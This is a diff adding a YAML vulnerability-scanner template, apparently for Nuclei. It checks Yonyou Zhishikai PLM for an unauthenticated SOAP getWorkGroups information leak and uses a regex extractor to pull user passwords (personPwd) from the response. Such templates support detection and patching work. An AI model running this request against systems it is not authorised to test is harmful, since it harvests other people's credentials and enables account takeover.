@@ -1,0 +1,43 @@
+id: zsiko-plm-getworkgroups-info-leak
+
+info:
+  name: 用友 智石开PLM getWorkGroups 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+
+http:
+  - raw:
+      - |
+        POST /services/MessageService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: 
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mes="MessageService">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <mes:getWorkGroups/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "com.ufida.pdm.webservice.utu.entity.PersionVO"
+          - "<personPwd"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+        condition: or
+        case-insensitive: true
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<personPwd>(.*?)</personPwd>"
